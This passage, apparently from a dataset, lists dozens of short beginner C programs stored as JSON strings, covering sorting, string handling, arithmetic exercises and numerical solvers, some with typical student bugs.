((clock_t)1000000000);\n    printf(\"\\nbitcount2: %g\\n\\n\", time);\n}\nint bitcount1(unsigned x)\n{\n    int b;\n    for (b = 0; x != 0; x >>= 1)\n    {\n        if (x & 01)\n        {\n            b++;\n        }\n    }\n    return b;\n}\nint bitcount2(unsigned x)\n{\n   int b;\n   b = 0;\n   while (x != 0)\n   {\n       x &= (x - 1);\n       b++;\n   }\n    return b;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint diameterAreaCircum(double radius, double *diameter, double *area, double *circumference);\nint main(void)\n{\n    double radius, diameter, area, circumference;\n    printf(\"Enter the radius of a circle: \");\n    scanf(\"%lf\", &radius);\n    diameterAreaCircum(radius, &diameter, &area, &circumference);\n    printf(\"-----------------------\\n\"\n           \"Diameter: %f\\n\"\n           \"Area: %f\\n\"\n           \"Circumference: %f\\n\", diameter, area, circumference);\n    return 0;\n}\nint diameterAreaCircum(double radius, double *diameter, double *area, double *circumference)\n{\n    *diameter = 2 * radius;\n    *area = pow((2.143 * radius), 2);\n    *circumference = 2 * 2.143 * radius;\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n#include <string.h>\nint main(){\n char v1[100];\n char *v2=((void*)0);\n int i;\n printf(\"Write a word\");\n fgets(v1, 100, (stdin));\n v2 = malloc(sizeof(char)*strlen(v1)+1);\n for (i=0; v1[i]!=0; i++){\n  v2[i] = toupper(v1[i]);\n }\n v2[i]='\\0';\n printf(\"Converted string: %s\", v2);\n free(v2);\n}",
    "#include <stdio.h>\nint main()\n{\n    int num=0, total=0;\n    float amt=0.0, dis=0.0;\n    printf(\"Enter the number of books: \");\n    scanf(\"%d\", &num);\n    if(num<=10000)\n    {\n        printf(\"No discount.\\n\");\n        amt=num*10;\n    }\n    else if(num>10000 && num<=15000)\n    {\n        printf(\"You've obtained 10%% discount.\\n\");\n        total=num*10;\n        dis=0.1*total;\n        amt=total-dis;\n    }\n    else if(num>15000 && num<=20000)\n    {\n        printf(\"You've obtained 20%% discount.\\n\");\n        total=num*10;\n        dis=0.2*total;\n        amt=total-dis;\n    }\n else\n {\n  printf(\"You can purchase upto 20000 books.\\n\");\n  return 0;\n }\n printf(\"The total cost = \u20b9%.3f\\n\", amt);\n    printf(\"The total discount = \u20b9%.3f\\n\", dis);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nchar isPowerOf(int x, int power) {\n    if (x == 1) return 1;\n    if (x < power) return 0;\n    while (x > 1) {\n        int powerDigit = x % power;\n        printf(\"power digit: %d\\n\", powerDigit);\n        if (powerDigit != 0) {\n            return 0;\n        }\n        x = x / power;\n    }\n    return 1;\n}\nint main() {\n    int n;\n    printf(\"Enter n: \");\n    scanf(\"%d\", &n);\n    printf(\"n = %d\\n\", n);\n    if (isPowerOf(n, 5)) printf(\"%d is power of 5\", n);\n    else printf(\"%d is not power of 5\", n);\n    printf(\"\\n\");\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main()\n{\n    double income, grade, minimum_wage;\n    scanf(\"%lf %lf %lf\", &income, &grade, &minimum_wage);\n    double social_scholarship, excellence_scholarship = 0.0;\n    if(income < minimum_wage && grade > 4.50) {\n        social_scholarship = minimum_wage * 0.35;\n    }\n    if(grade >= 5.50) {\n        excellence_scholarship = grade * 25;\n    }\n    if(social_scholarship != 0 && excellence_scholarship != 0) {\n        if(social_scholarship > excellence_scholarship) {\n            printf(\"You get a Social scholarship %.0f BGN\", floor(social_scholarship));\n        }\n        else {\n            printf(\"You get a scholarship for excellent results %.0f BGN\", floor(excellence_scholarship));\n        }\n    }\n    else if(social_scholarship != 0 && excellence_scholarship == 0) {\n        printf(\"You get a Social scholarship %.0f BGN\", floor(social_scholarship));\n    }\n    else if(social_scholarship == 0 && excellence_scholarship != 0) {\n        printf(\"You get a scholarship for excellent results %.0f BGN\", floor(excellence_scholarship));\n    }\n    else {\n        printf(\"You cannot get a scholarship!\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main (void) {\n  int a, b, c;\n  scanf(\"%d %d %d\", &a, &b, &c);\n  int m = a > b ? a : b;\n  m = m > c ? m : c;\n  printf(\"%d eh o maior\\n\", m);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int i, n, temp, j, arr[10];\n printf(\"\\n Enter the number of elements in the array : \");\n scanf(\"%d\", &n);\n printf(\"\\n Enter the elements: \");\n for(i=0;i<n;i++)\n  scanf(\"%d\", &arr [i]);\n for(i=0;i<n;i++)\n {\n  for(j=0;j<n-i-1;j++)\n  {\n   if(arr[j] > arr[j+1])\n   {\n    temp = arr[j];\n    arr[j] = arr[j+1];\n    arr[j+1] = temp;\n   }\n  }\n }\n printf(\"\\n The array sorted in ascending order is :\\n\");\n for(i=0;i<n;i++)\n  printf(\"%d\\t\", arr[i]);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n   int x=5;\n   int *j;\n     j=&x;\n   printf(\"%d %u\\n\",x,j);\n    printf(\"%d %u\\n\",*j,&x);\n     printf(\"%u \\n\",*&j);\n    return 0;\n}",
    "#include <stdio.h>\nvoid skip(char *msg) {\n    puts(msg + 6);\n}\nint main() {\n    int drinks[] = {4, 2, 3};\n    printf(\"first bill: %i cups\\n\", drinks[0]);\n    printf(\"first bill: %i cups\\n\", *drinks);\n    printf(\"third bill: %i cups\\n\", drinks[2]);\n    printf(\"third bill: %i cups\\n\", *(drinks + 2));\n    printf(\"drinks 's address is %p\\n\", drinks);\n    printf(\"drinks + 1 's address is %p\\n\", drinks + 1);\n    char *msg = \"Don't call me\";\n    skip(msg);\n}",
    "#include <stdio.h>\nint check(int a)\n{\n    int i;\n    for (i = 2; i*i < a; i++) {\n        if (a%(i*i) == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\nint main(int argc, char* argv[])\n{\n    int n;\n    freopen(\"input.txt\", \"r\", (stdin));\n    while (scanf(\"%d\", &n),n) {\n        if (check(n)) {\n            printf(\"Yes\\n\");\n        } else {\n            printf(\"No\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid right_rotate(char s[],int);\nint main() {\n    char str[101];\n    int n;\n    scanf(\"%s%d\",str,&n);\n    right_rotate(str,n);\n    printf(\"%s\",str);\n return 0;\n}\nvoid right_rotate(char str[],int n)\n{\n    char str1[101];\n    int len=0;\n    while(str[len]!='\\0')\n     {\n         len++;\n     }\n    int i,j;\n    for(i=0;i<len;++i)\n     {\n         if(i+n>=len)\n          j=(i+n)%len;\n         else\n          j=i+n;\n         str1[j]=str[i];\n     }\n    for(i=0;i<len;i++)\n      str[i]=str1[i];\n}",
    "#include <stdio.h>\nint main(){\n int num;\n printf(\"Enter positive integer: \");\n scanf(\"%d\", &num);\n if( num<0 ){\n  return 0;\n }\n if( num%2 == 0 ){\n  printf(\"Even number\");\n }\n else{\n  printf(\"Odd number\");\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid displayMenu() {\n    char *menuStr = \"********** MENU **********\\n\"\n            \"0 - exit\\n\"\n            \"1 - read content from file\\n\"\n            \"2 - write content to file\\n\"\n            \"**************************\\n\";\n    puts(menuStr);\n}\nint readFile(char *filePath) {\n    if (((void*)0) == filePath) {\n        return -1;\n    }\n    FILE *fp = fopen(filePath, \"r\");\n    if (((void*)0) == fp) {\n        perror(\"open file fail\");\n        return -1;\n    }\n    char c;\n    while ((-1) != (c = fgetc(fp))) {\n        putc(c, (stdout));\n    }\n    putc('\\n', (stdout));\n    fclose(fp);\n    return 0;\n}\nint writeFile(char *filePath) {\n    FILE *fp = fopen(filePath, \"w\");\n    if (((void*)0) == fp) {\n        perror(\"open file fail\");\n        return -1;\n    }\n    size_t num = fprintf(fp, \"write something:%d\", rand());\n    if (num < 0) {\n        fprintf((stderr), \"write data to file fail\");\n        return -1;\n    }\n    fclose(fp);\n    return 0;\n}\nvoid commandControl() {\n    char *filePath = \"/tmp/file_read_write.temp\";\n    do {\n        char c = getchar();\n        if ('0' == c) {\n            puts(\"bye bye!\");\n            break;\n        } else if ('1' == c) {\n            readFile(filePath);\n            displayMenu();\n        } else if ('2' == c) {\n            writeFile(filePath);\n            displayMenu();\n        } else if ('\\n' == c || '\\r' == c) {\n            continue;\n        } else {\n            puts(\"invalid commander, enter again.\");\n            displayMenu();\n        }\n    } while (1);\n}\nint main(int argc, char **argv) {\n    displayMenu();\n    commandControl();\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int t;\n scanf(\"%d\",&t);\n while(t--)\n {\n     int n;\n     scanf(\"%d\",&n);\n     if(n%2==0)\n     {\n         printf(\"1\\n\");\n     }\n     else\n     {\n         printf(\"0\\n\");\n     }\n }\n return 0;\n}",
    "int main ()\n{\n    int i;\n    float j;\n    i = -i;\n    return 0;\n}",
    "void p();\nint BLAST_NONDET;\nint c;\nint main() {\n  c = 0;\n  p();\n  if(c == 199) ERROR:goto ERROR;\n  return 0;\n}\nvoid p() {\n if (BLAST_NONDET) c=c+1; else c=c+2;\n if (BLAST_NONDET) c=c+4; else c=c+8;\n if (BLAST_NONDET) c=c+16; else c=c+32;\n if (BLAST_NONDET) c=c+64; else c=c+128;\n if (BLAST_NONDET) c=c+256; else c=c+512;\n}",
    "#include <stdio.h>\nint main() {\n    char buf[100];\n    scanf(\"%s\", &buf);\n    printf(\"buf = %s\\n\", buf);\n    int a;\n    scanf(\"%d\", &a);\n    printf(\"a = %d\\n\", a);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\n\n\nvoid newton_array(const int n_elements,\n                    const double manom[],\n                    const double ecc[],\n                    const double tol,\n                    const int max_iter,\n                    double eanom[]){\n    int i;\n    for (i = 0; i < n_elements; i ++){\n        double diff;\n        int niter = 0;\n        int half_max = max_iter/2.0;\n        eanom[i] -= (eanom[i] - (ecc[i] * sin(eanom[i])) - manom[i]) / (1.0 - (ecc[i] * cos(eanom[i])));\n        diff = (eanom[i] - (ecc[i] * sin(eanom[i])) - manom[i]) / (1.0 - (ecc[i] * cos(eanom[i])));\n        while ((fabs(diff) > tol) && (niter <= max_iter)){\n            eanom[i] -= diff;\n            if (niter == half_max) {\n                eanom[i] = 3.14159265358979323846;\n            }\n            diff = (eanom[i] - (ecc[i] * sin(eanom[i])) - manom[i]) / (1.0 - (ecc[i] * cos(eanom[i])));\n            niter += 1;\n        }\n        if (niter >= max_iter){\n            printf(\"%f %f %f %f >= %d iter\\n\", manom[i], eanom[i], diff, ecc[i], max_iter);\n            eanom[i] = -1;\n        }\n    }\n}\nvoid mikkola_array(const int n_elements, const double manom[], const double ecc[], double eanom[]){\n    int i;\n    double alpha, beta, aux, z, s0, s1, se0, ce0;\n    double f, f1, f2, f3, f4, u1, u2, u3;\n    for (i = 0; i < n_elements; i++){\n        alpha = (1.0 - ecc[i]) / ((4.0 * ecc[i]) + 0.5);\n        beta = (0.5 * manom[i]) / ((4.0 * ecc[i]) + 0.5);\n        aux = sqrt(beta*beta + alpha*alpha*alpha);\n        z = pow(fabs(beta + aux), (1.0/3.0));\n        s0 = z - (alpha/z);\n        s1 = s0 - (0.078*(pow(s0, 5))) / (1.0 + ecc[i]);\n        eanom[i] = manom[i] + (ecc[i] * (3.0*s1 - 4.0*(s1*s1*s1)));\n        se0=sin(eanom[i]);\n        ce0=cos(eanom[i]);\n        f = eanom[i]-ecc[i]*se0-manom[i];\n        f1 = 1.0-ecc[i]*ce0;\n        f2 = ecc[i]*se0;\n        f3 = ecc[i]*ce0;\n        f4 = -f2;\n        u1 = -f/f1;\n        u2 = -f/(f1+0.5*f2*u1);\n        u3 = -f/(f1+0.5*f2*u2+(1.0/6.0)*f3*u2*u2);\n        eanom[i] += -f/(f1+0.5*f2*u3+(1.0/6.0)*f3*u3*u3+(1.0/24.0)*f4*(u3*u3*u3));\n    }\n}\nint main(void){\n    double m[] = {.5, 1, 1.5};\n    double ecc[] = {.25, .75, .83};\n    double tol = 1e-9;\n    int mi = 100;\n    double eanom[] = {0, 0, 0};\n    newton_array(3, m, ecc, tol, mi, eanom);\n    int i;\n    for (i = 0; i < 3; i++){\n        printf(\"eanom[%d] = %f\\n\", i, eanom[i]);\n        eanom[i] = 0;\n    }\n    mikkola_array(3, m, ecc, eanom);\n    for (i = 0; i < 3; i++){\n        printf(\"eanom[%d] = %f\\n\", i, eanom[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n char ch;int i;\n puts(\"Enter message: \");\n printf(\"In B1FF-speak: \");\n while (1)\n {\n  ch=getchar();\n  if (ch<32) break;\n  if (ch>='a'&&ch<='z') ch-=32;\n  switch (ch)\n  {\n   case 'A':ch='4';break;\n   case 'B':ch='8';break;\n   case 'E':ch='3';break;\n   case 'I':ch='1';break;\n   case 'O':ch='0';break;\n   case 'S':ch='5';break;\n  }\n  putchar(ch);\n }\n for (i=1;i<=10;i++) putchar('!');putchar('\\n');\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int distance = 100;\n    int test = 200;\n    printf(\"You are %d miles away %d\\n\", distance, test);\n    printf(\"Hello world\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint mestrlen(const char *);\nint main(int argc, char *argv[])\n{\n char str1[] = \"hello world\\n\";\n printf(\"%d\\n\", mestrlen(str1) );\n return 0;\n}\nint mestrlen(const char * string)\n{\n int i = 0;\n for( ; string[i]; i++);\n return i;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(){\n    int num, arm, i, count, temp, digit;\n    count = 0;\n    arm = 0;\n    scanf(\"%d\", &num);\n    temp = num;\n    while(temp != 0){\n        count++;\n        temp /= 10;\n    }\n    temp = num;\n    while(temp != 0){\n        digit = temp % 10;\n        arm = arm + pow(digit, count);\n        temp /= 10;\n    }\n    if(num == arm){\n        printf(\"Armstrong Number\");\n    }else{\n        printf(\"Not an Armstrong number\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint pseudo_random_int(int min, int max) {\n  return (rand() % max) + min;\n}\nvoid print_numbers(double *numbers, int list_size) {\n  int i;\n  for(i = 0; i < list_size; i++) {\n    if (i != 0 && i % 10 == 0) {\n      printf(\"\\n\");\n    }\n    printf(\"%10.0f \", numbers[i]);\n  }\n  printf(\"\\n\");\n}\nint double_comparer(const void *input1, const void *input2) {\n  double *element1 = (double*)input1;\n  double *element2 = (double*)input2;\n  return *element1 - *element2;\n}\nint main(void) {\n  int i;\n  double *list_of_doubles = malloc(100 * sizeof(double));\n  srand(time(((void*)0)));\n  for(i = 0; i < 100; i++) {\n    list_of_doubles[i] = pseudo_random_int(100, 4000);\n  }\n  printf(\"Before qsort:\\n\");\n  print_numbers(list_of_doubles, 100);\n  qsort(list_of_doubles, 100, sizeof(double), double_comparer);\n  printf(\"After qsort:\\n\");\n  print_numbers(list_of_doubles, 100);\n  free(list_of_doubles);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint main()\n{\n int n,a,b;\n scanf(\"%d\",&n);\n a=n+1;\n while(1)\n {\n  b=2;\n  while(a%b!=0&&b<=a)\n  {\n   b++;\n   }\n  if(a==b)\n  {\n   printf(\"%d \",a);\n   return 0;\n   }\n  a++;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int decimal, binary[100], i, len;\n    printf(\"Enter Decimal number: \");\n    scanf(\"%d\", &decimal);\n    i = 0;\n    while (decimal >= 0) {\n        binary[i] = decimal % 2;\n        decimal = decimal / 2;\n        i++;\n        if (decimal == 0) {\n            break;\n        }\n    }\n    binary[i] = '\\0';\n    len = i - 1;\n    printf(\"The Binary number: \");\n    for (i = len; i >= 0; i--) {\n        printf(\"%d\", binary[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char * argv[])\n{\n    printf(\"\\n*** strcat ***\\n\");\n    {\n        char str[20] = \"Hello\";\n        strcat(str, \" world!\");\n        printf(\"%s\\n\", str);\n    }\n    printf(\"\\n*** strcat (return) ***\\n\");\n    {\n        char str[20] = \"Hello\";\n        printf(\"%s\\n\", strcat(str, \" world!\"));\n    }\n    printf(\"\\n*** strlen ***\\n\");\n    {\n        char str[20] = \"Hello\";\n        printf(\"%d\\n\", strlen(str));\n    }\n    printf(\"\\n*** strcpy ***\\n\");\n    {\n        char str[10];\n        strcpy(str, \"Hello\");\n        printf(\"%s\\n\", str);\n    }\n    printf(\"\\n*** strcpy (return) ***\\n\");\n    {\n        char str[10];\n        printf(\"%s\\n\", strcpy(str, \"Hello\"));\n    }\n    printf(\"\\n*** strcmp ***\\n\");\n    {\n        char str[] = \"Hello\";\n        printf(\"%d\\n\", strcmp(str, \"Hello\"));\n    }\n    exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int X = 1, contador = 1, A[1] = {1}, i = 0;\n    while (X != 0)\n    {\n        scanf(\"%d\", &X);\n        if (X == 0)\n        {\n            break;\n        }\n        while (contador <= X)\n        {\n            if (contador != X)\n            {\n                printf(\"%d \", A[0]);\n            }\n            else\n            {\n                printf(\"%d\", A[0]);\n                printf(\"\\n\");\n            }\n            A[0] = A[0] + 1;\n            contador++;\n        }\n        A[0]= 1;\n        contador = 1;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid revstr(char *c,int length)\n{\n    char temp;\n    if(length==1||length==0)\n    return;\n    temp=c[0];\n    c[0]=c[length-1];\n    c[length-1]=temp;\n    revstr(c+1,length-2);\n}\nint main()\n{\n    int n,i;\n    scanf(\"%d\\n\",&n);\n    char str[n];\n    for(i=0;i<n;i++)\n    {scanf(\"%c\",&str[i]);}\n    revstr(str,n);\n    printf(\"%s\",str);\n    return (0);\n}",
    "#include <stdio.h>\nint pangram(const char *s)\n{\n int c, mask = (1 << 26) - 1;\n while ((c = (*s++)) != '\\0')\n  if ((c &= ~0x20) <= 'Z' && c >= 'A')\n   mask &= ~(1 << (c - 'A'));\n return !mask;\n}\nint main()\n{\n int i;\n const char *s[] = { \"The quick brown fox jumps over lazy dogs.\",\n    \"The five boxing wizards dump quickly.\", };\n for (i = 0; i < 2; i++)\n  printf(\"%s: %s\\n\", pangram(s[i]) ? \"yes\" : \"no \", s[i]);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(void)\n{\n    char *str1 = \"Michael\";\n    char str2[] = \"Vine\";\n    printf(\"\\nThe lenght of string 1 is %ld\\n\" , strlen(str1));\n    printf(\"The lenght of string 2 is %ld\\n\", strlen(str2));\n    return 0;\n}",
    "#include <stdio.h>\n__attribute__((returns_nonnull, nonnull))\nint *getNonnullPtr(int *ptr) {\n  return ptr;\n}\nint *getNullablePtr(int *ptr) {\n return ptr;\n}\n__attribute__((returns_nonnull))\nint* test(int i) {\n  int *ptr = &i;\n  if (i) {\n    return getNonnullPtr(ptr);\n  } else {\n    return getNullablePtr(ptr);\n  }\n}\nint main() {\n int *i = test(1);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\n#include <string.h>\nint main(){\n double A, B, C, X, Y, R1, R2;\n scanf(\"%lf %lf %lf\", &A, &B, &C);\n X=((B*B)-4*A*C);\n if(((B * B) - 4 * A * C) < 0 || A == 0){\n  printf(\"Impossivel calcular\\n\");\n }\n else{\n  Y= sqrt(X);\n  R1=(-B+Y)/(2*A);\n  R2=(-B-Y)/(2*A);\n  printf(\"R1 = %.5lf\\n\", R1);\n  printf(\"R2 = %.5lf\\n\", R2);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n;\n    printf(\"Digite um numero entre 0-100: \");\n    scanf(\"%d\", &n);\n    if ( n <= 100 && n >= 0)\n    {\n        printf(\"\\nO numero %d esta entre 0 e 100\", n);\n    }\n    else\n    {\n        printf(\"\\nO numero %d nao esta entre 0 e 100\", n);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint f(int);\nint main(){\n int n,x1,x;\n scanf(\"%d\",&n);\n for(x1=n+1,x=x1;f(x1)!=1;x1++);{}\n printf(\"%d\",x1);\n return 0;\n}\nint f(int m){\n int i,y;\n for(i=2;m%i!=0;i++)\n{\n}\n if(i==m)\n return 1;\n else\n return 0;\n}",
    "#include <stdio.h>\n\nint max;\nchar line[1000];\nchar longest[1000];\nint _getline(void);\nvoid copy(void);\nint main() {\n  int length;\n  extern int max;\n  extern char longest[1000];\n  max = 0;\n  while ((length = _getline()) > 0) {\n    if (length > max) {\n      max = length;\n      copy();\n    }\n  }\n  if (max > 0) {\n    printf(\"%s\", longest);\n  }\n  return 0;\n}\nint _getline(void) {\n  int character, counter;\n  extern char line[];\n  counter = 0;\n  while (counter < 1000 - 1 && (character = getchar()) != (-1) && character != '\\n') {\n    line[counter] = character;\n    ++counter;\n  }\n  if (character == '\\n') {\n    line[counter] = character;\n    ++counter;\n  }\n  line[counter] = '\\0';\n  return counter;\n}\nvoid copy(void) {\n  int counter;\n  extern char line[], longest[];\n  counter = 0;\n  while ((longest[counter] = line[counter]) != '\\0') {\n    ++counter;\n  }\n}",
    "#include<stdio.h>\n#include<math.h>\nint main()\n{\n    float a, b, c, xp,xn, delta, raiz, real, imag, imagp, imagn;\n    printf(\"Digite os valores de a, b e c:\\n\");\n    scanf(\"%f %f %f\", &a, &b, &c);\n    delta = (pow(b,2) - (4*a*c));\n    raiz = sqrt(delta);\n    if(delta > 0)\n    {\n        xp = ((-b) + raiz)/ 2*a;\n        xn = ((-b) - raiz)/2*a;\n        printf(\"\\nA equa\u00e7\u00e3o tem ra\u00edzes reais\\nx1 = %.2f\\nx2 = %.2f\\n\", xp, xn);\n    }\n    if(delta < 0)\n    {\n        real = ((-b)/2*a);\n        printf(\"\\nA equa\u00e7\u00e3o tem raiz imaginaria\\n\\nParte real:\\nx = %.0f\\n\",real);\n        delta = -(delta);\n        raiz = sqrt(delta);\n        imag = ((-b)/2*a);\n        imagp = + (raiz/2*a);\n        imagn = - (raiz/2*a);\n        if(imagp > 0 && imagn < 0)\n        {\n            printf(\"\\nparte imaginaria\\nx1 = %.0f + %.0fi\\nx2 = %.0f %.0fi\\n\", imag,imagp,imag,imagn);\n        }\n        if(imagp < 0 && imagn > 0)\n        {\n            printf(\"\\nparte imaginaria\\nx1 = %.0f %.0fi\\nx2 = %.0f + %.0fi\\n\", imag,imagp,imag,imagn);\n        }\n        if(imagn < 0 && imagp < 0)\n        {\n            printf(\"\\nparte imaginaria\\nx1 = %.0f %.0fi\\nx2 = %.0f %.0fi\\n\", imag,imagp,imag,imagn);\n        }\n    }\n    if(delta == 0)\n    {\n        xp = ((-b) + raiz)/ 2*a;\n        printf(\"\\nA equa\u00e7\u00e3o tem raiz DUPLA\\nx = %.2f\\n\", xp);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nvoid line_by_line(int no){\n    int arr[100];\n    int j,i=0,r;\n        while (no!=0) {\n            r = no%10;\n            arr[i] = r;\n            i++;\n            no = no/10;\n        }\n        for (j=i-1; j>-1; j--) {\n            printf(\"Number : %d\\n\",arr[j]);\n        }\n}\nvoid sum_digit(int no){\n    int sum=0;\n        while (no) {\n            sum += no%10;\n            no /=10;\n        }\n    printf(\"The sum of the number is %d\\n\",sum);\n}\nvoid total_digit(int no){\n    int n=0;\n    while (no!=0) {\n        no = no/10;\n        n++;\n    }\n    printf(\"Number of digit are %d\\n\",n);\n}\nint main()\n{\n    int no;\n    printf(\"Enter the number :\");\n    scanf(\"%d\",&no);\n    line_by_line(no);\n    sum_digit(no);\n    total_digit(no);\n}",
    "#include <stdio.h>\nint main(void)\n{\nint value,Total;\nchar size;\n    printf(\"Enter Total Digit:\");\n    scanf(\"%d\",&size);\nfor(int count=1;count<=size;count++){\n    printf(\"Enter %d\\'s digit:\",count);\n    scanf(\"%d\",&value);\n    Total=(Total*10)+value;\n}\nprintf(\"Value is :%d\",Total);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[])\n{\n int N;\n int num[1000];\n int t,i, total;\n freopen(\"input.txt\", \"r\", (stdin));\n while(scanf(\"%d\", &N), N) {\n  for (i=0; i<N; i++)\n   scanf(\"%d\", &num[i]);\n  scanf(\"%d\", &t);\n  for (i=0, total=0; i<N; i++)\n   if (t == num[i]) total ++;\n  printf(\"%d\\n\", total);\n }\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nint n,first=1,second=2,next,c;\nprintf(\"Enter the number of terms\\n\");\nscanf(\"%d\",&n);\nprintf(\"First %d terms of fibonacci series are:\\n\",n);\nfor(c=1;c<n;c++)\n{\nprintf(\"%d, \",first);\nnext=first+second;\nfirst=second;\nsecond=next;\n}\nreturn 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nvoid ShowHeader( FILE * , double * , double * , double * , double * );\nvoid ReadColumn( FILE * , double * , int * );\nvoid UpdateDescriptiveStats( double * , int * , double * , double * , double * );\nvoid CalcStdDev( double * , int * , double * , double * );\nint main()\n{\n    char outFileName[8] = \"outfile\";\n    char inFileName[100];\n    double fileData[100];\n    int itemCount = 0;\n    int i = 0;\n    FILE *ofp, *ifp;\n    double min = 0, max = 0, avg = 0, stdDev = 0;\n    printf(\"Enter name of file to analyze:\\n\");\n    scanf(\"%99s\",inFileName);\n    ifp = fopen(inFileName,\"r\");\n    if( ifp == ((void*)0) )\n    {\n        printf( \"Error opening file: %s\\n\", inFileName );\n        return -1;\n    }\n    printf(\"File Opened Successfully\\n\");\n    ofp = fopen(outFileName,\"w\");\n    ReadColumn( ifp , fileData , &itemCount );\n    UpdateDescriptiveStats( fileData , &itemCount , &min , &max , &avg );\n    CalcStdDev( fileData , &itemCount , &avg , &stdDev );\n    printf(\"Descriptive Statsitics of Contained Data:\\n\");\n    printf(\"Min:\\t\\tMax:\\t\\tAvg:\\t\\tStd Dev:\\n%lf\\t%lf\\t%lf\\t%lf\\n\", min , max , avg, stdDev);\n    ShowHeader( ofp , &min , &max , &avg , &stdDev );\n    fclose( ifp );\n    fclose( ofp );\n    return 0;\n}\nvoid ShowHeader( FILE *ofp , double *min , double *max , double *avg , double *stdDev )\n{\n    fprintf( ofp , \"Descriptive Statsitics of Contained Data:\\n\");\n    fprintf( ofp , \"Min:\\t\\tMax:\\t\\tAvg:\\t\\tStd Dev:\\n%lf\\t%lf\\t%lf\\t%lf\\n\", *min , *max , *avg, *stdDev);\n}\nvoid ReadColumn( FILE *ifp , double *fileData , int *itemCount )\n{\n    int i = 0;\n    double temp;\n    *itemCount = 0;\n    while( fscanf( ifp , \"%lf\" , &temp ) != (-1) )\n    {\n        fileData[i] = temp;\n        *itemCount = *itemCount + 1;\n        i = i + 1;\n    }\n}\nvoid UpdateDescriptiveStats( double *fileData , int *itemCount , double *min , double *max , double *avg )\n{\n    int i = 0;\n    double sum = 0;\n    *min = fileData[0];\n    *max = fileData[0];\n    for( i = 0 ; i < *itemCount ; i++)\n    {\n        if( fileData[i] < *min )\n        {\n            *min = fileData[i];\n        }\n        if( fileData[i] > *max )\n        {\n            *max = fileData[i];\n        }\n        sum += fileData[i];\n    }\n    *avg = sum / *itemCount;\n}\nvoid CalcStdDev( double *fileData , int *itemCount , double *avg , double *stdDev )\n{\n    int i = 0;\n    double n = *itemCount;\n    double sum = 0;\n    for( i = 0 ; i < *itemCount ; i++ )\n    {\n        sum += ( fileData[i] - *avg ) * ( fileData[i] - *avg );\n    }\n    *stdDev = sqrt( ( 1 / ( n - 1 ) ) * sum );\n}",
    "#include <stdio.h>\nint main() {\n  int tableSize, row, col;\n  printf(\"Please enter a size for your table (1 - 20): \");\n  scanf(\"%i\", &tableSize);\n  if (tableSize < 1 || tableSize > 20) {\n    printf(\"We can't make a table that size. Sorry!\\n\");\n    printf(\"We'll use the default size of 10 instead.\\n\");\n    tableSize = 10;\n  }\n  for (row = 1; row <= tableSize; row++) {\n    for (col = 1; col <= tableSize; col++) {\n      printf(\"%4d\", row * col);\n    }\n    printf(\"\\n\");\n  }\n  printf(\"\\nFinal variable values:\\n\");\n  printf(\"  row == %d\\n  col == %d\\n  tableSize == %d\\n\", row, col, tableSize);\n}",
    "#include <stdio.h>\nint main()\n{\n    int fahr, celsius;\n    int lower, upper, step;\n    lower=0;\n    upper=300;\n    step=20;\n    fahr=lower;\n    while (fahr <= upper){\n        celsius=5*(fahr-32)/9;\n        printf(\"%d\\t%d\\n\", fahr, celsius);\n        fahr=fahr+step;\n    }\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main()\n{\n    char dummy;\n    printf(\"Enter value for dummy:\");\n    scanf(\"%c\", &dummy);\n    if ((0 ? isalpha(dummy) : (((unsigned)(dummy)|32)-'a') < 26))\n        printf(\"You entered an alphabet\");\n    else\n        {\n            printf(\"You entered a non alphabet\");\n        }\n    return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\nint main(void) {\n  char *line = ((void*)0);\n  size_t size = 0;\n  ssize_t ret;\n  while ((ret = getline(&line, &size, (stdin))) != -1)\n    printf(\"(%lu) %s\", size, line);\n  return 0;\n}",
